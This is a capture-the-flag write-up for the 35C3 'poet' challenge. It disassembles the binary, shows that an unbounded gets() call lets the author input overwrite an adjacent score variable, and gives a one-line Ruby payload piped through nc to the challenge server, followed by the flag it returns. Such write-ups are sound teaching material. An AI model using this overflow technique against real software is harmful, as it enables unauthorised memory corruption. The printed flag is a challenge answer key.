# poet

> Solves: 214

> We are looking for the [poet](poet) of the year:
> `nc 35.207.132.47 22223`

> Difficulty estimate: very easy

## Analysis

Given only the binary program we must first disassemble it.
The `main` function of the program looks like this:

```
000000000040098b <main>:
  40098b:	53                   	push   rbx
  40098c:	b9 00 00 00 00       	mov    ecx,0x0
  400991:	ba 02 00 00 00       	mov    edx,0x2
  400996:	be 00 00 00 00       	mov    esi,0x0
  40099b:	48 8b 3d de 16 20 00 	mov    rdi,QWORD PTR [rip+0x2016de]        # 602080 <stdout@@GLIBC_2.2.5>
  4009a2:	e8 99 fc ff ff       	call   400640 <setvbuf@plt>
  4009a7:	48 8d 3d 92 02 00 00 	lea    rdi,[rip+0x292]        # 400c40 <_IO_stdin_used+0x1c0>
  4009ae:	e8 4d fc ff ff       	call   400600 <puts@plt>
  4009b3:	48 8d 1d e6 16 20 00 	lea    rbx,[rip+0x2016e6]        # 6020a0 <poem>
  4009ba:	b8 00 00 00 00       	mov    eax,0x0
  4009bf:	e8 71 ff ff ff       	call   400935 <get_poem>
  4009c4:	b8 00 00 00 00       	mov    eax,0x0
  4009c9:	e8 97 ff ff ff       	call   400965 <get_author>
  4009ce:	b8 00 00 00 00       	mov    eax,0x0
  4009d3:	e8 df fd ff ff       	call   4007b7 <rate_poem>
  4009d8:	81 bb 40 04 00 00 40 	cmp    DWORD PTR [rbx+0x440],0xf4240
  4009df:	42 0f 00
  4009e2:	74 0e                	je     4009f2 <main+0x67>
  4009e4:	48 8d 3d 45 03 00 00 	lea    rdi,[rip+0x345]        # 400d30 <_IO_stdin_used+0x2b0>
  4009eb:	e8 10 fc ff ff       	call   400600 <puts@plt>
  4009f0:	eb c8                	jmp    4009ba <main+0x2f>
  4009f2:	b8 00 00 00 00       	mov    eax,0x0
  4009f7:	e8 6b fd ff ff       	call   400767 <reward>
  4009fc:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
```

The program reads in "poems" and rates them until the score achieved by them
reaches 1,000,000 points. The rating function is the most complex piece of the
code but we can ignore it as both `get_poem` and `get_author` turn out to be
vulnerable to a buffer overflow:

```
0000000000400965 <get_author>:
  400965:	48 83 ec 08          	sub    rsp,0x8
  400969:	48 8d 3d a8 02 00 00 	lea    rdi,[rip+0x2a8]        # 400c18 <_IO_stdin_used+0x198>
  400970:	b8 00 00 00 00       	mov    eax,0x0
  400975:	e8 96 fc ff ff       	call   400610 <printf@plt>
  40097a:	48 8d 3d 1f 1b 20 00 	lea    rdi,[rip+0x201b1f]        # 6024a0 <poem+0x400>
  400981:	e8 aa fc ff ff       	call   400630 <gets@plt>
  400986:	48 83 c4 08          	add    rsp,0x8
  40098a:	c3                   	ret
```

Since `gets` is not bounded in any way whatsoever it lets us write way all over
the programs memory. `get_author` is especially useful as it writes at the
location of `poet + 0x400` which is just before `poet + 0x440` (at `4009d8`
`rbx` is holding the address of the `poet` variable).

## Solution

Now that we know all this we just have to use the author input to overwrite the
score with a correct value encoded as ASCII (the bytes are reversed because the
system is [little endian](https://en.wikipedia.org/wiki/Endianness).

This is as simple as executing:

```bash
ruby -e 'puts; puts ?a * 0x40 + [0x40, 0x42, 0xf].pack("c*")' | nc 35.207.132.47 22223
```

```
**********************************************************
* We are searching for the poet of the year 2018.        *
* Submit your one line poem now to win an amazing prize! *
**********************************************************

Enter the poem here:
> Who is the author of this poem?
>
+---------------------------------------------------------------------------+
THE POEM

SCORED 1000000 POINTS.

CONGRATULATIONS

THE POET
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

RECEIVES THE AWARD FOR POET OF THE YEAR 2018!

THE PRIZE IS THE FOLLOWING FLAG:
35C3_f08b903f48608a14cbfbf73c08d7bdd731a87d39

+---------------------------------------------------------------------------+
```
